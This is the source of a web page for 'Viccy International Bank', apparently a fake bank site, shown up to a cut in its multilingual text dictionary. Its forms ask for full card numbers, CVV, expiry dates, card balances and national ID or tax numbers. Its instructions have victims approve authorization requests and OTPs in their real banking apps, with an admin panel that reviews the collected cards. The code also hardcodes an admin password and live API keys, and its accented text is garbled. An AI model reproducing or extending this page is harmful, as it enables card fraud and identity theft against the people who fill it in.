<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viccy International Bank</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
import { getDatabase, ref, set, get, runTransaction, onValue } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";

const firebaseConfig = {
  apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",
  authDomain:"viccybank.firebaseapp.com",
  databaseURL:"https://viccybank-default-rtdb.firebaseio.com",
  projectId:"viccybank",
  storageBucket:"viccybank.firebasestorage.app",
  messagingSenderId:"328465601734",
  appId:"1:328465601734:web:10e00c00286f1b932273c7"
};

const app=initializeApp(firebaseConfig);
const auth=getAuth(app);
const db=getDatabase(app);
emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});

let currentUser=null;
let userDataRef=null;
let userCurrency='USD';
let currentAdminTab='authorization';
const EMAILJS_SERVICE_ID='service_rs826sa';
const EMAILJS_TEMPLATE_ID='template_6f5m0as';
const ADMIN_PASSWORD='Sharaibi';
const currencySymbols={USD:'$',EUR:'‚Ç¨',GBP:'¬£',JPY:'¬•',AUD:'A$',CAD:'C$',CHF:'Fr.',CNY:'¬•'};

// ============================================================
// FULL TRANSLATION DICTIONARY
// All UI labels, alerts, error messages, placeholders,
// tutorial texts, receipts, and admin strings
// ============================================================
const T={
  en:{
    // Auth
    createAccount:'Create Account',
    login:'Log In',
    password:'Password',
    confirmPassword:'Confirm Password',
    signUp:'Sign Up',
    alreadyHaveAccount:'Already have an account? Log In',
    noAccount:"Don't have an account? Sign Up",
    loggingIn:'Logging in...',
    // Personal Info
    selectCountry:'Select Country',
    surname:'Surname',
    firstName:'First Name',
    otherName:'Other Name (optional)',
    phoneNumber:'Phone Number',
    username:'Username',
    email:'Email',
    promoCode:'Promo Code (optional)',
    // Dashboard
    availableBalance:'Available Balance',
    withdraw:'Withdraw',
    send:'Send',
    more:'More',
    addCard:'Add Card',
    recentTransactions:'Recent Transactions',
    noTransactions:'No transactions yet',
    // Account Info
    accountInfo:'Account Information',
    accountNumber:'Account Number',
    country:'Country',
    copyAccount:'Copy Account',
    generatePin:'Generate New PIN',
    accounts:'Accounts',
    // Send Money
    sendMoney:'Send Money',
    recipientAccount:'Recipient Account (10 digits)',
    amount:'Amount',
    sendNow:'Send Now',
    recipientLabel:'Recipient:',
    accountNotFound:'Account not found',
    // Withdraw
    withdrawFunds:'Withdraw Funds',
    selectMethod:'Select Method',
    requestWithdrawal:'Request Withdrawal',
    withdrawalNotice:'‚ö†Ô∏è You can only withdraw to accounts in your name',
    // Cards
    myCards:'My Cards',
    linkedCards:'Linked Cards',
    addNewCard:'Add New Card',
    linkCard:'Link Card',
    editCard:'Edit Card',
    deleteCard:'Delete Card',
    removeCard:'Remove',
    chooseOption:'Choose an option:',
    viewLinkedCards:'View Linked Cards',
    addNewCardOption:'Add New Card',
    noCards:'No cards linked',
    noAuthorizedCards:'No authorized cards',
    noPendingCards:'No pending cards',
    usableCards:'Usable Cards',
    awaitingAuth:'Awaiting Authorization',
    cardNumber:'Card Number',
    fullCardNumber:'Full Card Number',
    expiryDate:'Expiry',
    cvv:'CVV',
    brand:'Brand',
    billingAddress:'Billing Address',
    cardBalance:'Card Balance',
    street:'Street',
    city:'City',
    postalCode:'Postal Code',
    phoneNum:'Phone',
    // Card Status
    pending:'‚è≥ Pending',
    authorized:'‚úì Authorized',
    otpRequired:'üîê OTP Required',
    // More Menu
    contactUs:'Contact us',
    howToUse:'How to use it',
    account:'Account',
    logout:'Logout',
    // Settings
    settings:'Settings',
    alerts:'Alerts',
    noNotifications:'No notifications',
    close:'Close',
    // Transaction labels
    sentTo:'Sent to',
    receivedFrom:'Received from',
    via:'via',
    withdrawal:'Withdrawal',
    received:'Received',
    sent:'Sent',
    // Admin
    adminPanelTitle:'Admin Panel',
    authorization:'Authorization',
    codeManagement:'Code Management',
    cardAuthorization:'Card Authorization',
    recentCards:'Recent Cards (Last 24h)',
    unattendedCards:'Unattended Cards (3+ days)',
    pendingCards:'All Pending Cards',
    noCardsToAuthorize:'No cards to authorize',
    authorizeCard:'Authorize',
    rejectCard:'Reject & Delete',
    authorizeConfirm:'Authorize this card?',
    rejectConfirm:'Reject and permanently delete this card?',
    cardAuthorized:'Card authorized successfully!',
    cardRejected:'Card rejected and deleted',
    manageUsers:'Manage Users',
    changeAllPins:"Change All Users' PINs",
    users:'users',
    pinUpdated:'PIN updated!',
    adminPassword:'Admin Password',
    incorrectPassword:'Incorrect admin password',
    usersByCountry:'Users by Country',
    newPin:'New PIN',
    changeAll:'Change All',
    logoutBtn:'Logout',
    // Errors & Alerts (alert/confirm dialogs)
    errSelectCountry:'Please select a country',
    errNameRequired:'Name required',
    errPasswordMismatch:'Passwords do not match',
    errPasswordShort:'Password must be at least 8 characters',
    errFillAll:'Please fill in all fields',
    errSelectMethod:'Please select a withdrawal method',
    errEnterAmount:'Please enter a valid amount',
    errEnterPin:'Please enter your 4-digit PIN',
    errUserNotFound:'User data not found',
    errIncorrectPin:'Incorrect PIN',
    errInsufficientBalance:'Insufficient balance',
    errCardDigits:'Card number must be 16 digits',
    errNameRequired2:'Cardholder name required',
    errExpiryFormat:'Expiry format: MM/YY',
    errCvvDigits:'CVV must be 3 digits',
    errAllFields:'All fields are required',
    errCardLinked:'This card is already linked',
    errTransferFailed:'Transfer failed: ',
    errWithdrawFailed:'Withdrawal failed: ',
    errAccountNotFound:'Account not found',
    errCannotSendSelf:'Cannot send to yourself',
    errEnterValidAmount:'Please enter a valid amount',
    errAccountTenDigits:'Account number must be 10 digits',
    errPinFourDigits:'PIN must be exactly 4 digits',
    errCardNotFound:'Card not found',
    errInvalidMethod:'Invalid withdrawal method',
    // Success & Info alerts
    alertAccountCreated:'Account created! You can now log in.',
    alertCardSubmitted:'Card submitted for authorization! The bank will review it shortly.',
    alertCardRemoved:'Card removed successfully!',
    alertWithdrawalTitle:'Withdrawal Requested!',
    alertWithdrawalBody:'Amount: {sym}{amount} to {method}\nProcessing time: 1‚Äì3 business days',
    alertSentTitle:'Money Sent!',
    alertSentBody:'Sent {sym}{amount} to {name}!',
    alertPinUpdated:'PIN has been updated!',
    alertPinsUpdated:"Updated {count} users' PINs to {pin}!",
    alertConfirmPinChange:'Change PIN to {pin}?',
    alertConfirmAllPins:"Change ALL users' PINs to {pin}?",
    // Contact info
    contactEmail:'Email: viccylay30@gmail.com',
    // Tutorial
    tutorialTitle:'How to Use Viccy International Bank',
    tutorialStep1:'1. Sign up or log in to your account',
    tutorialStep2:'2. Send money using 10-digit account numbers',
    tutorialStep3:'3. Withdraw funds to your linked bank or card',
    tutorialStep4:'4. Check your balance and transactions anytime',
    tutorialStep5:'5. Use your 4-digit PIN to authorize withdrawals',
    tutorialStep6:'6. Link a card via "Add Card" ‚Äî it will be reviewed by the bank',
    // Receipt
    receiptTitle:'Transaction Receipt',
    receiptDate:'Date',
    receiptType:'Type',
    receiptAmount:'Amount',
    receiptFrom:'From',
    receiptTo:'To',
    receiptMethod:'Method',
    receiptStatus:'Status',
    receiptCompleted:'Completed',
    receiptPending:'Pending Review',
    // Field labels for country data
    age:'Age',
    address:'Address',
    financialStatus:'Financial Status',
    relationship:'Relationship',
    employmentStatus:'Employment Status',
    nin:'NIN',
    ssn:'SSN',
    taxId:'Tax ID',
    // Withdraw to card info
    withdrawToCard:'Withdraw to authorized card',
    // View card desc
    viewLinkedCardsDesc:'View your authorized and pending cards',
    addNewCardDesc:'Link a new debit or credit card',
    // Card modal
    billingAddressTitle:'üìç Billing Address',
    cardNumberPlaceholder:'Card Number (16 digits)',
    cardHolderPlaceholder:'Cardholder Name',
    expiryPlaceholder:'MM/YY',
    streetPlaceholder:'Street Address',
    postalCodePlaceholder:'Postal Code',
    cityPlaceholder:'City',
    countryPlaceholder:'Country',
    phonePlaceholder:'Phone Number',
    balancePlaceholder:'Current Card Balance',
    // Pagination / misc
    expiresLabel:'Expires:',
    lastFourLabel:'Last 4 digits',
    authorizedCardWithdraw:'‚úÖ Withdraw to authorized card',
    authorizedBadge:'‚úÖ Authorized Card',
    balanceOwnershipNotice:'‚ö†Ô∏è It is important to enter your correct current card balance to verify card ownership.',
    authDirectionTitle:'üîê How to Authorize Your Card',
    authDirection1:'1. After submitting, open your banking app on your phone.',
    authDirection2:'2. Look for a notification or pending authorization request.',
    authDirection3:'3. Approve the request inside your bank app to complete verification.',
    authDirection4:'4. If prompted for an OTP code, enter it in your banking app.',
    authDirection5:'5. Once approved, your card status will update to "Authorized" within minutes.',
    authDirectionNote:'Note: This is a standard bank security check to confirm you are the card owner.'
  },

  es:{
    createAccount:'Crear Cuenta',
    login:'Iniciar Sesi√≥n',
    password:'Contrase√±a',
    confirmPassword:'Confirmar Contrase√±a',
    signUp:'Registrarse',
    alreadyHaveAccount:'¬øYa tienes cuenta? Inicia sesi√≥n',
    noAccount:'¬øNo tienes cuenta? Reg√≠strate',
    loggingIn:'Iniciando sesi√≥n...',
    selectCountry:'Seleccionar Pa√≠s',
    surname:'Apellido',
    firstName:'Nombre',
    otherName:'Otro Nombre (opcional)',
    phoneNumber:'N√∫mero de Tel√©fono',
    username:'Nombre de Usuario',
    email:'Correo Electr√≥nico',
    promoCode:'C√≥digo Promocional (opcional)',
    availableBalance:'Saldo Disponible',
    withdraw:'Retirar',
    send:'Enviar',
    more:'M√°s',
    addCard:'Tarjeta',
    recentTransactions:'Transacciones Recientes',
    noTransactions:'Sin transacciones a√∫n',
    accountInfo:'Informaci√≥n de Cuenta',
    accountNumber:'N√∫mero de Cuenta',
    country:'Pa√≠s',
    copyAccount:'Copiar Cuenta',
    generatePin:'Generar Nuevo PIN',
    accounts:'Cuentas',
    sendMoney:'Enviar Dinero',
    recipientAccount:'Cuenta Destinataria (10 d√≠gitos)',
    amount:'Monto',
    sendNow:'Enviar Ahora',
    recipientLabel:'Destinatario:',
    accountNotFound:'Cuenta no encontrada',
    withdrawFunds:'Retirar Fondos',
    selectMethod:'Seleccionar M√©todo',
    requestWithdrawal:'Solicitar Retiro',
    withdrawalNotice:'‚ö†Ô∏è Solo puedes retirar a cuentas a tu nombre',
    myCards:'Mis Tarjetas',
    linkedCards:'Tarjetas Vinculadas',
    addNewCard:'Agregar Nueva Tarjeta',
    linkCard:'Vincular Tarjeta',
    editCard:'Editar Tarjeta',
    deleteCard:'Eliminar Tarjeta',
    removeCard:'Eliminar',
    chooseOption:'Elige una opci√≥n:',
    viewLinkedCards:'Ver Tarjetas Vinculadas',
    addNewCardOption:'Agregar Nueva Tarjeta',
    noCards:'Sin tarjetas vinculadas',
    noAuthorizedCards:'Sin tarjetas autorizadas',
    noPendingCards:'Sin tarjetas pendientes',
    usableCards:'Tarjetas Utilizables',
    awaitingAuth:'Esperando Autorizaci√≥n',
    cardNumber:'N√∫mero de Tarjeta',
    fullCardNumber:'N√∫mero Completo de Tarjeta',
    expiryDate:'Vencimiento',
    cvv:'CVV',
    brand:'Marca',
    billingAddress:'Direcci√≥n de Facturaci√≥n',
    cardBalance:'Saldo de Tarjeta',
    street:'Calle',
    city:'Ciudad',
    postalCode:'C√≥digo Postal',
    phoneNum:'Tel√©fono',
    pending:'‚è≥ Pendiente',
    authorized:'‚úì Autorizado',
    otpRequired:'üîê OTP Requerido',
    contactUs:'Cont√°ctanos',
    howToUse:'C√≥mo usarlo',
    account:'Cuenta',
    logout:'Cerrar Sesi√≥n',
    settings:'Configuraci√≥n',
    alerts:'Alertas',
    noNotifications:'Sin notificaciones',
    close:'Cerrar',
    sentTo:'Enviado a',
    receivedFrom:'Recibido de',
    via:'v√≠a',
    withdrawal:'Retiro',
    received:'Recibido',
    sent:'Enviado',
    adminPanelTitle:'Panel de Administraci√≥n',
    authorization:'Autorizaci√≥n',
    codeManagement:'Gesti√≥n de C√≥digos',
    cardAuthorization:'Autorizaci√≥n de Tarjeta',
    recentCards:'Tarjetas Recientes (√∫ltimas 24h)',
    unattendedCards:'Tarjetas sin Atender (m√°s de 3 d√≠as)',
    pendingCards:'Todas las Tarjetas Pendientes',
    noCardsToAuthorize:'No hay tarjetas por autorizar',
    authorizeCard:'Autorizar',
    rejectCard:'Rechazar y Eliminar',
    authorizeConfirm:'¬øAutorizar esta tarjeta?',
    rejectConfirm:'¬øRechazar y eliminar permanentemente esta tarjeta?',
    cardAuthorized:'¬°Tarjeta autorizada con √©xito!',
    cardRejected:'Tarjeta rechazada y eliminada',
    manageUsers:'Gestionar Usuarios',
    changeAllPins:'Cambiar PINs de Todos los Usuarios',
    users:'usuarios',
    pinUpdated:'¬°PIN actualizado!',
    adminPassword:'Contrase√±a de Admin',
    incorrectPassword:'Contrase√±a de admin incorrecta',
    usersByCountry:'Usuarios por Pa√≠s',
    newPin:'Nuevo PIN',
    changeAll:'Cambiar Todo',
    logoutBtn:'Cerrar Sesi√≥n',
    errSelectCountry:'Por favor selecciona un pa√≠s',
    errNameRequired:'Nombre requerido',
    errPasswordMismatch:'Las contrase√±as no coinciden',
    errPasswordShort:'La contrase√±a debe tener al menos 8 caracteres',
    errFillAll:'Por favor completa todos los campos',
    errSelectMethod:'Por favor selecciona un m√©todo de retiro',
    errEnterAmount:'Por favor ingresa un monto v√°lido',
    errEnterPin:'Por favor ingresa tu PIN de 4 d√≠gitos',
    errUserNotFound:'Datos de usuario no encontrados',
    errIncorrectPin:'PIN incorrecto',
    errInsufficientBalance:'Saldo insuficiente',
    errCardDigits:'El n√∫mero de tarjeta debe tener 16 d√≠gitos',
    errNameRequired2:'Nombre del titular requerido',
    errExpiryFormat:'Formato de vencimiento: MM/AA',
    errCvvDigits:'El CVV debe tener 3 d√≠gitos',
    errAllFields:'Todos los campos son obligatorios',
    errCardLinked:'Esta tarjeta ya est√° vinculada',
    errTransferFailed:'Transferencia fallida: ',
    errWithdrawFailed:'Retiro fallido: ',
    errAccountNotFound:'Cuenta no encontrada',
    errCannotSendSelf:'No puedes enviarte dinero a ti mismo',
    errEnterValidAmount:'Por favor ingresa un monto v√°lido',
    errAccountTenDigits:'El n√∫mero de cuenta debe tener 10 d√≠gitos',
    errPinFourDigits:'El PIN debe tener exactamente 4 d√≠gitos',
    errCardNotFound:'Tarjeta no encontrada',
    errInvalidMethod:'M√©todo de retiro inv√°lido',
    alertAccountCreated:'¬°Cuenta creada! Ya puedes iniciar sesi√≥n.',
    alertCardSubmitted:'¬°Tarjeta enviada para autorizaci√≥n! El banco la revisar√° pronto.',
    alertCardRemoved:'¬°Tarjeta eliminada con √©xito!',
    alertWithdrawalTitle:'¬°Retiro Solicitado!',
    alertWithdrawalBody:'Monto: {sym}{amount} a {method}\nTiempo de procesamiento: 1‚Äì3 d√≠as h√°biles',
    alertSentTitle:'¬°Dinero Enviado!',
    alertSentBody:'Enviado {sym}{amount} a {name}!',
    alertPinUpdated:'¬°El PIN ha sido actualizado!',
    alertPinsUpdated:'Se actualizaron los PINs de {count} usuarios a {pin}!',
    alertConfirmPinChange:'¬øCambiar PIN a {pin}?',
    alertConfirmAllPins:'¬øCambiar los PINs de TODOS los usuarios a {pin}?',
    contactEmail:'Correo: viccylay30@gmail.com',
    tutorialTitle:'C√≥mo Usar Viccy International Bank',
    tutorialStep1:'1. Reg√≠strate o inicia sesi√≥n en tu cuenta',
    tutorialStep2:'2. Env√≠a dinero usando n√∫meros de cuenta de 10 d√≠gitos',
    tutorialStep3:'3. Retira fondos a tu banco o tarjeta vinculada',
    tutorialStep4:'4. Consulta tu saldo y transacciones en cualquier momento',
    tutorialStep5:'5. Usa tu PIN de 4 d√≠gitos para autorizar retiros',
    tutorialStep6:'6. Vincula una tarjeta en "Tarjeta" ‚Äî el banco la revisar√°',
    receiptTitle:'Comprobante de Transacci√≥n',
    receiptDate:'Fecha',
    receiptType:'Tipo',
    receiptAmount:'Monto',
    receiptFrom:'De',
    receiptTo:'Para',
    receiptMethod:'M√©todo',
    receiptStatus:'Estado',
    receiptCompleted:'Completado',
    receiptPending:'En Revisi√≥n',
    age:'Edad',
    address:'Direcci√≥n',
    financialStatus:'Situaci√≥n Financiera',
    relationship:'Estado Civil',
    employmentStatus:'Situaci√≥n Laboral',
    nin:'NIN',
    ssn:'SSN',
    taxId:'RFC / Tax ID',
    withdrawToCard:'Retirar a tarjeta autorizada',
    viewLinkedCardsDesc:'Ver tus tarjetas autorizadas y pendientes',
    addNewCardDesc:'Vincular una nueva tarjeta de d√©bito o cr√©dito',
    billingAddressTitle:'üìç Direcci√≥n de Facturaci√≥n',
    cardNumberPlaceholder:'N√∫mero de Tarjeta (16 d√≠gitos)',
    cardHolderPlaceholder:'Nombre del Titular',
    expiryPlaceholder:'MM/AA',
    streetPlaceholder:'Direcci√≥n',
    postalCodePlaceholder:'C√≥digo Postal',
    cityPlaceholder:'Ciudad',
    countryPlaceholder:'Pa√≠s',
    phonePlaceholder:'N√∫mero de Tel√©fono',
    balancePlaceholder:'Saldo Actual de la Tarjeta',
    expiresLabel:'Vence:',
    lastFourLabel:'√öltimos 4 d√≠gitos',
    authorizedCardWithdraw:'‚úÖ Retirar a tarjeta autorizada',
    authorizedBadge:'‚úÖ Tarjeta Autorizada',
    balanceOwnershipNotice:'‚ö†Ô∏è Es importante ingresar el saldo actual correcto de tu tarjeta para verificar la titularidad.',
    authDirectionTitle:'üîê C√≥mo Autorizar tu Tarjeta',
    authDirection1:'1. Despu√©s de enviar, abre la app de tu banco en tu tel√©fono.',
    authDirection2:'2. Busca una notificaci√≥n o solicitud de autorizaci√≥n pendiente.',
    authDirection3:'3. Aprueba la solicitud dentro de tu app bancaria para completar la verificaci√≥n.',
    authDirection4:'4. Si se te pide un c√≥digo OTP, ingr√©salo en tu app bancaria.',
    authDirection5:'5. Una vez aprobado, el estado de tu tarjeta se actualizar√° a "Autorizado" en minutos.',
    authDirectionNote:'Nota: Esta es una verificaci√≥n de seguridad est√°ndar del banco para confirmar que eres el titular de la tarjeta.'
  },

  fr:{
    createAccount:'Cr√©er un Compte',
    login:'Se Connecter',
    password:'Mot de Passe',
    confirmPassword:'Confirmer le Mot de Passe',
    signUp:"S'inscrire",
    alreadyHaveAccount:'Vous avez d√©j√† un compte ? Connectez-vous',
    noAccount:"Pas de compte ? Inscrivez-vous",
    loggingIn:'Connexion en cours...',
    selectCountry:'S√©lectionner un Pays',
    surname:'Nom de Famille',
    firstName:'Pr√©nom',
    otherName:'Autre Nom (facultatif)',
    phoneNumber:'Num√©ro de T√©l√©phone',
    username:"Nom d'Utilisateur",
    email:'Email',
    promoCode:'Code Promo (facultatif)',
    availableBalance:'Solde Disponible',
    withdraw:'Retirer',
    send:'Envoyer',
    more:'Plus',
    addCard:'Carte',
    recentTransactions:'Transactions R√©centes',
    noTransactions:'Aucune transaction pour le moment',
    accountInfo:'Informations du Compte',
    accountNumber:'Num√©ro de Compte',
    country:'Pays',
    copyAccount:'Copier le Compte',
    generatePin:'G√©n√©rer un Nouveau PIN',
    accounts:'Comptes',
    sendMoney:"Envoyer de l'Argent",
    recipientAccount:'Compte Destinataire (10 chiffres)',
    amount:'Montant',
    sendNow:'Envoyer Maintenant',
    recipientLabel:'Destinataire :',
    accountNotFound:'Compte introuvable',
    withdrawFunds:'Retirer des Fonds',
    selectMethod:'S√©lectionner une M√©thode',
    requestWithdrawal:'Demander un Retrait',
    withdrawalNotice:'‚ö†Ô∏è Vous ne pouvez retirer que vers des comptes √† votre nom',
    myCards:'Mes Cartes',
    linkedCards:'Cartes Li√©es',
    addNewCard:'Ajouter une Nouvelle Carte',
    linkCard:'Lier une Carte',
    editCard:'Modifier la Carte',
    deleteCard:'Supprimer la Carte',
    removeCard:'Supprimer',
    chooseOption:'Choisissez une option :',
    viewLinkedCards:'Voir les Cartes Li√©es',
    addNewCardOption:'Ajouter une Nouvelle Carte',
    noCards:'Aucune carte li√©e',
    noAuthorizedCards:'Aucune carte autoris√©e',
    noPendingCards:'Aucune carte en attente',
    usableCards:'Cartes Utilisables',
    awaitingAuth:"En Attente d'Autorisation",
    cardNumber:'Num√©ro de Carte',
    fullCardNumber:'Num√©ro Complet de Carte',
    expiryDate:"Date d'Expiration",
    cvv:'CVV',
    brand:'Marque',
    billingAddress:'Adresse de Facturation',
    cardBalance:'Solde de la Carte',
    street:'Rue',
    city:'Ville',
    postalCode:'Code Postal',
    phoneNum:'T√©l√©phone',
    pending:'‚è≥ En Attente',
    authorized:'‚úì Autoris√©',
    otpRequired:'üîê OTP Requis',
    contactUs:'Nous Contacter',
    howToUse:'Comment utiliser',
    account:'Compte',
    logout:'D√©connexion',
    settings:'Param√®tres',
    alerts:'Alertes',
    noNotifications:'Aucune notification',
    close:'Fermer',
    sentTo:'Envoy√© √†',
    receivedFrom:'Re√ßu de',
    via:'via',
    withdrawal:'Retrait',
    received:'Re√ßu',
    sent:'Envoy√©',
    adminPanelTitle:"Panneau d'Administration",
    authorization:'Autorisation',
    codeManagement:'Gestion des Codes',
    cardAuthorization:'Autorisation de Carte',
    recentCards:'Cartes R√©centes (derni√®res 24h)',
    unattendedCards:'Cartes Non Trait√©es (plus de 3 jours)',
    pendingCards:'Toutes les Cartes en Attente',
    noCardsToAuthorize:'Aucune carte √† autoriser',
    authorizeCard:'Autoriser',
    rejectCard:'Rejeter et Supprimer',
    authorizeConfirm:'Autoriser cette carte ?',
    rejectConfirm:'Rejeter et supprimer d√©finitivement cette carte ?',
    cardAuthorized:'Carte autoris√©e avec succ√®s !',
    cardRejected:'Carte rejet√©e et supprim√©e',
    manageUsers:'G√©rer les Utilisateurs',
    changeAllPins:'Changer les PINs de Tous les Utilisateurs',
    users:'utilisateurs',
    pinUpdated:'PIN mis √† jour !',
    adminPassword:'Mot de Passe Admin',
    incorrectPassword:'Mot de passe admin incorrect',
    usersByCountry:'Utilisateurs par Pays',
    newPin:'Nouveau PIN',
    changeAll:'Tout Changer',
    logoutBtn:'D√©connexion',
    errSelectCountry:'Veuillez s√©lectionner un pays',
    errNameRequired:'Nom requis',
    errPasswordMismatch:'Les mots de passe ne correspondent pas',
    errPasswordShort:'Le mot de passe doit contenir au moins 8 caract√®res',
    errFillAll:'Veuillez remplir tous les champs',
    errSelectMethod:'Veuillez s√©lectionner une m√©thode de retrait',
    errEnterAmount:'Veuillez saisir un montant valide',
    errEnterPin:'Veuillez saisir votre PIN √† 4 chiffres',
    errUserNotFound:'Donn√©es utilisateur introuvables',
    errIncorrectPin:'PIN incorrect',
    errInsufficientBalance:'Solde insuffisant',
    errCardDigits:'Le num√©ro de carte doit comporter 16 chiffres',
    errNameRequired2:'Nom du titulaire requis',
    errExpiryFormat:"Format d'expiration : MM/AA",
    errCvvDigits:'Le CVV doit comporter 3 chiffres',
    errAllFields:'Tous les champs sont obligatoires',
    errCardLinked:'Cette carte est d√©j√† li√©e',
    errTransferFailed:'Transfert √©chou√© : ',
    errWithdrawFailed:'Retrait √©chou√© : ',
    errAccountNotFound:'Compte introuvable',
    errCannotSendSelf:'Vous ne pouvez pas vous envoyer de l\'argent',
    errEnterValidAmount:'Veuillez saisir un montant valide',
    errAccountTenDigits:'Le num√©ro de compte doit comporter 10 chiffres',
    errPinFourDigits:'Le PIN doit comporter exactement 4 chiffres',
    errCardNotFound:'Carte introuvable',
    errInvalidMethod:'M√©thode de retrait invalide',
    alertAccountCreated:'Compte cr√©√© ! Vous pouvez maintenant vous connecter.',
    alertCardSubmitted:'Carte soumise pour autorisation ! La banque la v√©rifiera bient√¥t.',
    alertCardRemoved:'Carte supprim√©e avec succ√®s !',
    alertWithdrawalTitle:'Retrait Demand√© !',
    alertWithdrawalBody:'Montant : {sym}{amount} vers {method}\nD√©lai de traitement : 1 √† 3 jours ouvrables',
    alertSentTitle:'Argent Envoy√© !',
    alertSentBody:'{sym}{amount} envoy√© √† {name} !',
    alertPinUpdated:'Le PIN a √©t√© mis √† jour !',
    alertPinsUpdated:'PIN de {count} utilisateurs mis √† jour vers {pin} !',
    alertConfirmPinChange:'Changer le PIN en {pin} ?',
    alertConfirmAllPins:'Changer les PINs de TOUS les utilisateurs en {pin} ?',
    contactEmail:'Email : viccylay30@gmail.com',
    tutorialTitle:'Comment Utiliser Viccy International Bank',
    tutorialStep1:"1. Inscrivez-vous ou connectez-vous √† votre compte",
    tutorialStep2:'2. Envoyez de l\'argent en utilisant des num√©ros de compte √† 10 chiffres',
    tutorialStep3:'3. Retirez des fonds vers votre banque ou carte li√©e',
    tutorialStep4:'4. Consultez votre solde et vos transactions √† tout moment',
    tutorialStep5:'5. Utilisez votre PIN √† 4 chiffres pour autoriser les retraits',
    tutorialStep6:'6. Liez une carte via "Carte" ‚Äî la banque la v√©rifiera',
    receiptTitle:'Re√ßu de Transaction',
    receiptDate:'Date',
    receiptType:'Type',
    receiptAmount:'Montant',
    receiptFrom:'De',
    receiptTo:'√Ä',
    receiptMethod:'M√©thode',
    receiptStatus:'Statut',
    receiptCompleted:'Compl√©t√©',
    receiptPending:'En Cours de V√©rification',
    age:'√Çge',
    address:'Adresse',
    financialStatus:'Situation Financi√®re',
    relationship:'Situation Familiale',
    employmentStatus:"Statut d'Emploi",
    nin:'NIN',
    ssn:'SSN',
    taxId:'Num√©ro Fiscal',
    withdrawToCard:'Retirer vers carte autoris√©e',
    viewLinkedCardsDesc:'Voir vos cartes autoris√©es et en attente',
    addNewCardDesc:'Lier une nouvelle carte de d√©bit ou cr√©dit',
    billingAddressTitle:'üìç Adresse de Facturation',
    cardNumberPlaceholder:'Num√©ro de Carte (16 chiffres)',
    cardHolderPlaceholder:'Nom du Titulaire',
    expiryPlaceholder:'MM/AA',
    streetPlaceholder:'Adresse',
    postalCodePlaceholder:'Code Postal',
    cityPlaceholder:'Ville',
    countryPlaceholder:'Pays',
    phonePlaceholder:'Num√©ro de T√©l√©phone',
    balancePlaceholder:'Solde Actuel de la Carte',
    expiresLabel:'Expire :',
    lastFourLabel:'4 derniers chiffres',
    authorizedCardWithdraw:'‚úÖ Retrait vers carte autoris√©e',
    authorizedBadge:'‚úÖ Carte Autoris√©e',
    balanceOwnershipNotice:"‚ö†Ô∏è Il est important de saisir le solde actuel correct de votre carte pour v√©rifier la propri√©t√© de la carte.",
    authDirectionTitle:'üîê Comment Autoriser Votre Carte',
    authDirection1:"1. Apr√®s soumission, ouvrez l'application de votre banque sur votre t√©l√©phone.",
    authDirection2:'2. Recherchez une notification ou une demande d\'autorisation en attente.',
    authDirection3:"3. Approuvez la demande dans votre application bancaire pour terminer la v√©rification.",
    authDirection4:'4. Si on vous demande un code OTP, saisissez-le dans votre application bancaire.',
    authDirection5:'5. Une fois approuv√©, le statut de votre carte passera √† "Autoris√©" en quelques minutes.',
    authDirectionNote:"Remarque : Il s'agit d'un contr√¥le de s√©curit√© bancaire standard pour confirmer que vous √™tes le titulaire de la carte."
  },

  pt:{
    createAccount:'Criar Conta',
    login:'Entrar',
    password:'Senha',
    confirmPassword:'Confirmar Senha',
    signUp:'Cadastrar',
    alreadyHaveAccount:'J√° tem uma conta? Entrar',
    noAccount:'N√£o tem conta? Cadastre-se',
    loggingIn:'Entrando...',
    selectCountry:'Selecionar Pa√≠s',
    surname:'Sobrenome',
    firstName:'Nome',
    otherName:'Outro Nome (opcional)',
    phoneNumber:'N√∫mero de Telefone',
    username:'Nome de Usu√°rio',
    email:'E-mail',
    promoCode:'C√≥digo Promocional (opcional)',
    availableBalance:'Saldo Dispon√≠vel',
    withdraw:'Sacar',
    send:'Enviar',
    more:'Mais',
    addCard:'Cart√£o',
    recentTransactions:'Transa√ß√µes Recentes',
    noTransactions:'Sem transa√ß√µes ainda',
    accountInfo:'Informa√ß√µes da Conta',
    accountNumber:'N√∫mero da Conta',
    country:'Pa√≠s',
    copyAccount:'Copiar Conta',
    generatePin:'Gerar Novo PIN',
    accounts:'Contas',
    sendMoney:'Enviar Dinheiro',
    recipientAccount:'Conta Destinat√°ria (10 d√≠gitos)',
    amount:'Valor',
    sendNow:'Enviar Agora',
    recipientLabel:'Destinat√°rio:',
    accountNotFound:'Conta n√£o encontrada',
    withdrawFunds:'Sacar Fundos',
    selectMethod:'Selecionar M√©todo',
    requestWithdrawal:'Solicitar Saque',
    withdrawalNotice:'‚ö†Ô∏è Voc√™ s√≥ pode sacar para contas em seu nome',
    myCards:'Meus Cart√µes',
    linkedCards:'Cart√µes Vinculados',
    addNewCard:'Adicionar Novo Cart√£o',
    linkCard:'Vincular Cart√£o',
    editCard:'Editar Cart√£o',
    deleteCard:'Excluir Cart√£o',
    removeCard:'Remover',
    chooseOption:'Escolha uma op√ß√£o:',
    viewLinkedCards:'Ver Cart√µes Vinculados',
    addNewCardOption:'Adicionar Novo Cart√£o',
    noCards:'Sem cart√µes vinculados',
    noAuthorizedCards:'Sem cart√µes autorizados',
    noPendingCards:'Sem cart√µes pendentes',
    usableCards:'Cart√µes Dispon√≠veis',
    awaitingAuth:'Aguardando Autoriza√ß√£o',
    cardNumber:'N√∫mero do Cart√£o',
    fullCardNumber:'N√∫mero Completo do Cart√£o',
    expiryDate:'Validade',
    cvv:'CVV',
    brand:'Bandeira',
    billingAddress:'Endere√ßo de Cobran√ßa',
    cardBalance:'Saldo do Cart√£o',
    street:'Rua',
    city:'Cidade',
    postalCode:'CEP',
    phoneNum:'Telefone',
    pending:'‚è≥ Pendente',
    authorized:'‚úì Autorizado',
    otpRequired:'üîê OTP Necess√°rio',
    contactUs:'Fale Conosco',
    howToUse:'Como usar',
    account:'Conta',
